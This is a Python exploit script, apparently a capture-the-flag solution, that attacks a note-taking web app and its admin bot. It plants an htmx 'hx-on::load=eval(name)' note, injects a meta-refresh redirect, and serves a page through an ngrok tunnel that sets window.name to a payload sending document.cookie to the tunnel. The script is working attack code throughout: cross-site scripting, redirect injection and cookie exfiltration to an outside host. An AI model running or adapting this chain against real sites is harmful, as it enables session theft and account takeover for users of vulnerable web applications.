from pyngrok import ngrok
from flask import Flask
from urllib.parse import quote_plus
import re
import requests
from multiprocessing import Process

URL = "http://localhost:8080"
BOT_URL = "http://localhost:8081"
TUNNEL = ngrok.connect("1337", "tcp").public_url.replace("tcp", "http", 1)

def place_htmx_payload(payload):
    data = {"value": payload, "path": ""}
    r = requests.post(URL + "/api/v1/note", data=data)

    note_id = re.search(r"note&#x2F;(.*)'", r.text).group(1)
    return note_id

def redirect_bot():
    client_side_redirect_payload = quote_plus(b"\n\n<meta http-equiv='refresh' content='0;url=" + TUNNEL.encode() + b"'>")
    full_payload = "http://app:8080/api/v1/note?value=a&path=" + client_side_redirect_payload
    requests.post(BOT_URL + "/", data={"url" : full_payload})

def server(note_id, xss_payload):
    app = Flask(__name__)

    @app.route("/")
    def index():
        return """
        <script>
            const TARGET = "%s";
            const w = open(TARGET, "%s");
        </script>
        """ % (note_id, xss_payload)

    app.run("0.0.0.0", port=1337)

def main():
    print("[+] Tunnel: " + TUNNEL)
    note_id = place_htmx_payload("<i hx-on::load=eval(name)>")
    note_url = f"http://app:8080/note/{note_id}"
    xss_payload = f"location='{TUNNEL}/?flag='+document.cookie"
    flask_server = Process(target=server, args=(note_url, xss_payload))
    flask_server.start()
        
    redirect_bot()

if __name__ == "__main__":
    main()
